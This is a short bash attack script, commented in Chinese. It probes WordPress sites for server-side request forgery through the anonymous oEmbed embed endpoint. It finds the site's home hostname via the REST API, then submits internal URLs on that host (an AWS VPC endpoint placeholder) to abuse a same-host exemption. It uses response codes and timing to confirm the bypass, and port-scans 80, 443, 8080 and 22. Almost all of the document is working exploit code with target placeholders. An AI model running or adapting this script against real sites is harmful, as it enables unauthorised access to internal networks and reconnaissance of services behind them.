#!/usr/bin/env bash
# 用法：先取站点 home 主机名，再用同一主机名作 url 打在匿名 embed 端点上
# BLOG 形如 https://host/blog （WordPress 子目录）或 https://host
BLOG='https://<target>/blog'
B="$BLOG/wp-json/oembed/1.0/embed"
# 1) 找 home 主机名（三处任取其一）：REST _links、文章 link、oEmbed provider_url
curl -sk -A "$ARTEX_UA" "$BLOG/wp-json/wp/v2/posts?per_page=1&_fields=link"
# 2) 把 home 主机名 + 任意文章路径拼成内网 URL，走匿名取址
HOME_HOST='vpce-xxxx.vpce-svc-xxxx.us-east-1.vpce.amazonaws.com'
SLUG='<post-slug>'
curl -sk -A "$ARTEX_UA" -m 45 -G "$B" \
  --data-urlencode "url=http://$HOME_HOST/$SLUG/" \
  --data-urlencode "_=cb$RANDOM$RANDOM" \
  -D - -o out.json -w '\n[http=%{http_code} time=%{time_total} size=%{size_download}]\n'
# 3) 判据：200 且 out.json 的 provider_url/title 来自内网 home 主机 = same_host 豁免 SSRF 成立；
#    404 且耗时 ~0.3-0.5s = 私网校验拒绝（对照用 IP 字面量 http://10.0.0.1/ 应 404）
# 4) 端口探测：仅 :80/:443/:8080 被 WP 端口白名单允许，其余直接 false
for p in 80 443 8080 22; do
  curl -sk -A "$ARTEX_UA" -m 45 -G "$B" --data-urlencode "url=http://$HOME_HOST:$p/" \
    --data-urlencode "_=cb$RANDOM" -o /dev/null -w "port $p [http=%{http_code} time=%{time_total}]\n"
done